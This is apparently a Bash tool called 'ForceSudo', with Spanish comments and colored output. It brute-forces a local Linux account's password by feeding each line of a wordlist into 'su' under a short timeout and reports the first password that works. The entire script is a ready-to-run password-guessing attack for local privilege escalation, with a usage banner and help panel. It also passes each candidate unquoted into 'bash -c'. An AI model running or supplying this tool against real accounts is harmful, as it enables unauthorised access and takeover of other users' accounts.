#!/bin/bash

# Definir colores
rojo_luminoso='\033[1;31m'
verde_luminoso='\033[1;32m'
amarillo_luminoso='\033[1;33m'
azul_luminoso='\033[1;34m'
magenta_luminoso='\033[1;35m'
cyan_luminoso='\033[1;36m'
blanco_luminoso='\033[1;37m'
sin_color='\033[0m'

# Banner
function banner() {
    echo -e "${rojo_luminoso}"
    echo "  _____                  ____            _       "
    echo " |  ___|__  _ __ ___ ___/ ___| _   _  __| | ___  "
    echo " | |_ / _ \| '__/ __/ _ \___ \| | | |/ _  |/ _ \ "
    echo " |  _| (_) | | | (_|  __/___) | |_| | (_| | (_) |"
    echo " |_|  \___/|_|  \___\___|____/ \__,_|\__,_|\___/ "
    echo -e "${azul_luminoso}                                     Anonymous17${sin_color}\n"
}

# Manejo de Ctrl+C
function ctrl_c() {
    echo -e "\n\n${rojo_luminoso}[!] Saliendo...${sin_color}\n"
    exit 1
}
trap ctrl_c INT

# Panel de ayuda
function helpPanel() {
    echo -e "\n${amarillo_luminoso}[i]${cyan_luminoso} Uso:\n"
    echo -e "\t${rojo_luminoso}-h)${azul_luminoso} Mostrar este panel de ayuda"
    echo -e "\t${rojo_luminoso}-u)${azul_luminoso} Usuario a probar"
    echo -e "\t${rojo_luminoso}-d)${azul_luminoso} Diccionario a utilizar"
    echo -e "\n\t${rojo_luminoso}Ejemplo:${azul_luminoso} $0 ${magenta_luminoso}-u ${verde_luminoso}usuario ${magenta_luminoso}-d ${verde_luminoso}diccionario.txt${sin_color}\n"
    exit 1
}

# Fuerza intento de sudo con diccionario
function force_sudo() {
    local usuario="$1"
    local archivo="$2"

    if [[ ! -f "$archivo" ]]; then
        echo -e "\n${rojo_luminoso}[ERROR]${blanco_luminoso} El archivo '$archivo' no existe.${sin_color}\n"
        exit 1
    fi

    banner
    echo -e "${amarillo_luminoso}[*] Username: ${verde_luminoso}$usuario${sin_color}"
    echo -e "${amarillo_luminoso}[*] Wordlist: ${verde_luminoso}$archivo${sin_color}"

    local line_number=0

    while IFS= read -r password; do
        ((line_number++))
	echo -ne "${amarillo_luminoso}[?] Probando: ${verde_luminoso}(Línea $line_number)-> ${rojo_luminoso}$password                  \r"

        if timeout 0.2 bash -c "echo $password | su -s /bin/bash $usuario -c 'echo Autenticado'" &> /dev/null; then
            echo -e "\n${amarillo_luminoso}[+] Contraseña encontrada:${verde_luminoso} $password\n"
            exit 0
        fi
    done < "$archivo"

    echo -e "\n${rojo_luminoso}[-] No se encontró una contraseña válida.${sin_color}\n"
}

# Obtener opciones
declare -i parameter_counter=0
while getopts "hu:d:" arg; do
    case $arg in
        h) helpPanel;;
        u) usuario=$OPTARG; let parameter_counter+=1;;
        d) archivo=$OPTARG; let parameter_counter+=1;;
        *) helpPanel;;
    esac
done

# Ejecutar si se ingresaron los dos parámetros requeridos
if [[ $parameter_counter -eq 2 ]]; then
    force_sudo "$usuario" "$archivo"
else
    helpPanel
fi

